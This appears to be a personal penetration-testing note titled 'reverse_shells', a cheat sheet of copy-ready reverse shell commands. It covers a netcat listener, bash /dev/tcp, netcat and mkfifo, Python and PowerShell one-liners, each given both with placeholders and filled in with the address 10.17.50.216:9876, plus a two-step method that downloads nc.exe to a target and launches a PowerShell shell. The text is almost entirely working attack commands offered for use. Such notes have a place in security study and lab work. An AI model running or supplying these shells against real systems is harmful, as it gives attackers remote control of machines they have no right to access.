---
id: reverse_shells
aliases:
  - ON ATTACKING MACHINE
tags: []
---

## ON ATTACKING MACHINE
Start a listener:
```
$ nc -lnvp <port>
  - l: listen mode, for inbound connections
  - n: numeric-only IP addresses, no DNS lookup
  - v: verbose
  - p: local port number
```
EXAMPLE
`$ nc -lvnp 9876`

## ON TARGET MACHINE
Call back to attacking machine:

#### WITH BASH
`$ bash -i >& /dev/tcp/<IP>/<port> 0>&1`

EXAMPLE
`S bash -i >& /dev/tcp/10.17.50.216/9876 0>&1`

#### WITH NETCAT 
`$ nc -e /bin/bash <IP> <PORT>`

`$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f` 
			
EXAMPLE
`$ nc -e /bin/bash 10.17.50.216 9876` 

`$rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.50.216 9876 >/tmp/f` 

#### WITH PYTHON 
`$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` 
		
`$ import socket,os,pty;s=socket.socket();s.connect(("<IP>",<PORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")` 

EXAMPLES
`$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.50.216",9876));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
		
`$ import socket,os,pty;s=socket.socket();s.connect(("10.17.50.216",9876));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")` 	
		
#### WITH POWERSHELL

`> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` 
	
EXAMPLE
`> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.17.50.216',9876);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` 
	
	
Two Steps:

  1.) Execute this command to remotely download netcat to the target machine:
  
    > powershell curl 10.17.50.216:8000/nc.exe -o nc.exe

  2.) Execute netcat to launch a reverse shell:
  
    > nc.exe 10.17.50.216 9876 -e powershell
